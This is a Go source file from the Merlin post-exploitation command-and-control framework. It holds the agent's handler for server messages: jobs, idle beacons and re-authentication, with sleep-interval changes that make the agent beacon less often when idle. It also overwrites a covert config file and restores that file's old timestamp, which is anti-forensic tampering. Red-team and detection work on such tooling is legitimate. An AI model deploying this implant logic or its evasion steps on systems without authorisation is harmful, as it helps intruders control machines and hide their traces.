// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2021  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"fmt"
	"io/ioutil"
	"os"
	"time"

	// Internal
	"github.com/Ne0nd0g/merlin/pkg/agent/cli"
	"github.com/Ne0nd0g/merlin/pkg/jobs"
	"github.com/Ne0nd0g/merlin/pkg/messages"
	"github.com/Ne0nd0g/merlin/pkg/opaque"
)

// messageHandler processes an input message from the server and adds it to the job channel for processing by the agent
func (a *Agent) messageHandler(m messages.Base) {
	cli.Message(cli.DEBUG, "Entering into agent.messageHandler function")
	cli.Message(cli.SUCCESS, fmt.Sprintf("%s message type received!", messages.String(m.Type)))

	if m.ID != a.ID {
		cli.Message(cli.WARN, fmt.Sprintf("Input message was not for this agent (%s):\r\n%+v", a.ID, m))
	}

	var result jobs.Results
	switch m.Type {
	case messages.JOBS:
		a.jobHandler(m.Payload.([]jobs.Job))
		if (a.WaitTimeMin != a.ActiveMin) && (a.InactiveCount >= 0) {
			a.InactiveCount = 0
			a.WaitTimeMin = a.ActiveMin
			a.WaitTimeMax = a.ActiveMax

			// Send unprompted agentInfo command to update the sleep time
			aInfo := jobs.Job{
				AgentID: a.ID,
				Type:    jobs.AGENTINFO,
			}
			aInfo.Payload = a.getAgentInfoMessage()
			jobsOut <- aInfo
		} else if (a.InactiveCount == -1) && (a.WaitTimeMin != a.ActiveMin) {
			a.InactiveCount = 0
			a.WaitTimeMin = a.ActiveMin
			a.WaitTimeMax = a.ActiveMax
			// Get the file's touch time
			origcovertconfigtimefile, err := os.Stat(a.CovertConfig)
			var origcovertconfigtime time.Time
			if err != nil {
				origcovertconfigtime = time.Unix(0, 0)
			} else {
				origcovertconfigtime = origcovertconfigtimefile.ModTime()
			}

			err2 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
			if err2 == nil {
				// Touch it back
				if origcovertconfigtime != time.Unix(0, 0) {
					os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
				}
			}
		} else {
			a.InactiveCount++
		}
	case messages.IDLE:
		cli.Message(cli.NOTE, "Received idle command, doing nothing")
		if (a.InactiveCount == -1) && (a.WaitTimeMin != a.ActiveMin) {
			a.InactiveCount = 0
			a.WaitTimeMin = a.ActiveMin
			a.WaitTimeMax = a.ActiveMax
			// Get the file's touch time
			origcovertconfigtimefile, err := os.Stat(a.CovertConfig)
			var origcovertconfigtime time.Time
			if err != nil {
				origcovertconfigtime = time.Unix(0, 0)
			} else {
				origcovertconfigtime = origcovertconfigtimefile.ModTime()
			}

			err2 := ioutil.WriteFile(a.CovertConfig, []byte("0000000000"), 0755)
			if err2 == nil {
				// Touch it back
				if origcovertconfigtime != time.Unix(0, 0) {
					os.Chtimes(a.CovertConfig, origcovertconfigtime, origcovertconfigtime)
				}
			}
		}
		a.InactiveCount++
		if a.InactiveCount == a.InactiveThreshold {
			a.InactiveCount = 0
			a.WaitTimeMin *= a.InactiveMultiplier
			a.WaitTimeMax *= a.InactiveMultiplier

			// Send unprompted agentInfo command to update the sleep time
			aInfo := jobs.Job{
				AgentID: a.ID,
				Type:    jobs.AGENTINFO,
			}
			aInfo.Payload = a.getAgentInfoMessage()
			jobsOut <- aInfo
		}
	case messages.OPAQUE:
		if m.Payload.(opaque.Opaque).Type == opaque.ReAuthenticate {
			cli.Message(cli.NOTE, "Received re-authentication request")
			// Re-authenticate, but do not re-register
			msg, err := a.Client.Auth("opaque", false)
			//temporarily speed up for orphan recovery
			a.WaitTimeMin = 15
			a.WaitTimeMax = 30
			a.InactiveCount = 0
			if err != nil {
				a.FailedCheckin++
				a.InactiveCount++
				if a.InactiveCount == a.InactiveThreshold {
					a.InactiveCount = 0
					a.WaitTimeMin *= a.InactiveMultiplier
					a.WaitTimeMax *= a.InactiveMultiplier
					//Should only happen if orphaned agents checks in and isn't interacted with
					if a.WaitTimeMin < a.ActiveMin {
						a.WaitTimeMin = a.ActiveMin
						a.WaitTimeMax = a.ActiveMax
					} else {
						a.WaitTimeMin *= a.InactiveMultiplier
						a.WaitTimeMax *= a.InactiveMultiplier
					}
					// Send unprompted agentInfo command to update the sleep time
					aInfo := jobs.Job{
						AgentID: a.ID,
						Type:    jobs.AGENTINFO,
					}
					aInfo.Payload = a.getAgentInfoMessage()
					jobsOut <- aInfo

				}
				result.Stderr = err.Error()
				jobsOut <- jobs.Job{
					AgentID: a.ID,
					Type:    jobs.RESULT,
					Payload: result,
				}
			}
			a.messageHandler(msg)
		}
	default:
		result.Stderr = fmt.Sprintf("%s is not a valid message type", messages.String(m.Type))
		jobsOut <- jobs.Job{
			AgentID: m.ID,
			Type:    jobs.RESULT,
			Payload: result,
		}
	}
	cli.Message(cli.DEBUG, "Leaving agent.messageHandler function without error")
}
